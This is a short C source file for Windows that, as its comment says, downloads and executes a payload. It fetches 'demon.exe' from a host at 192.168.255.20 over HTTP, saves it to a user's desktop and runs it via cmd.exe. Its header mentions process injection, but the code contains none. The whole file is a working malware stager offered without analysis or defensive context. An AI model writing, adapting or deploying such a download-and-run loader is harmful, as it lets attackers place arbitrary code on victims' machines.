//Downloads and executes payload

// Remote Process Injection


#include <stdio.h>
#include <Windows.h>
#include <urlmon.h>
#include <stdint.h>
#include <winnt.h>
#include <fileapi.h>

int main()
{
	const char* filename = "c:\\Users\\saurav\\Desktop\\demon.exe";
	URLDownloadToFile(NULL, "http://192.168.255.20:8000/demon.exe", filename, 0, NULL);
	system("cmd.exe /c c:\\Users\\saurav\\desktop\\demon.exe");

	return 0;
	
}
